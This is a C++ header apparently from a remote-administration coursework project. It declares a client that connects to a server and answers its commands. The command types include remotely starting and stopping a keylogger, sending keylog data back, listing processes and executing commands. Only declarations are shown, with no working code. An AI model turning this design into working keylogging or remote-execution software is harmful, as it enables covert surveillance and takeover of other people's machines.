#ifndef LPTF_CLIENT_HPP
#define LPTF_CLIENT_HPP

#include "LPTF_Socket.h"
#include "LPTF_Packet.h"
#include "SystemInfo.h"
#include "ProcessManager.h"

#include <string>
#include <iostream>
#include <conio.h>
#include <thread>
#include <sys/types.h>
#include <sys/time.h>
using namespace std;

// Command types for the client-server communication
enum class CommandType : uint8_t {
    HOST_INFO_REQUEST = 0x01,
    START_KEYLOGGER_REQUEST = 0x02,
    STOP_KEYLOGGER_REQUEST = 0x03,
    LIST_PROCESSES_REQUEST = 0x04,
    EXECUTE_COMMAND_REQUEST = 0x05,
    SEND_MESSAGE = 0x07,
    // Response types
    HOST_INFO_RESPONSE = 0x81,
    KEY_LOG_DATA_RESPONSE = 0x82,
    PROCESS_LIST_RESPONSE = 0x84,
    COMMAND_RESULT_RESPONSE = 0x85
};

class LPTF_Client {
public:
    // Constructor that initializes the socket and connects to the server
    explicit LPTF_Client(const std::string& ip, int port);
    // Destructor
    ~LPTF_Client();

    // Disable copy constructor and assignment operator
    LPTF_Client(const LPTF_Client&) = delete;
    // Disable assignment operator
    LPTF_Client& operator=(const LPTF_Client&) = delete;

    // Main loop for the client
    // It reads user input, sends packets, and receives responses
    void run();
private:
    // Socket object for communication
    LPTF_Socket socket;

    // Sends a packet constructed from a string message
    void sendPacketFromString(const std::string& message, CommandType type);
    // Receives a packet from the server and prints the response
    bool receivePacketAndPrint();

    // Handles commands received from the server
    void handleCommand(const LPTF_Packet& packet);

    // Sends the list of running processes to the server
    void sendProcessList();
};
#endif
